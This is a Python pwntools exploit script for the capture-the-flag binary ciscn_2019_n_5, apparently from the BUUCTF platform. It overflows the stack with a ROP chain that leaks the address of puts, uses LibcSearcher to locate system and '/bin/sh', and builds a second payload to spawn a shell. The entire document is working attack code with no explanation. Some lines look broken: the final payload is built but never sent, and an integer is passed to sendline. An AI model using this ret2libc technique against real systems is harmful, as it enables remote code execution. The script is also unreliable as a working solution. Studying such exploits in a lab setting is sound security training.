from pwn import *
from LibcSearcher import LibcSearcher
context(log_level='DEBUG')
io = process("./ciscn_2019_n_5")
elf = ELF('./ciscn_2019_n_5')
#io = remote('node3.buuoj.cn',28410)
io.recv()
io.sendline("123")
pop_rdi_ret = 0x00400713
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x400636
io.recv()
payload = 'a'*0x28+p64(pop_rdi_ret) + p64(puts_got)+p64(puts_plt)+p64(main)
io.sendline(payload)
puts_addr = u64(io.recv(6).ljust(8, '\x00'))
libc = LibcSearcher('puts',puts_addr)
base = puts_addr - libc.dump('puts')
sys_addr = base + libc.dump('system')
bin_sh = base + libc.dump('str_bin_sh')
io.sendline(11)
ret = 0x4004c9
payload = 'a'*0x28+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(sys_addr)
io.interactive()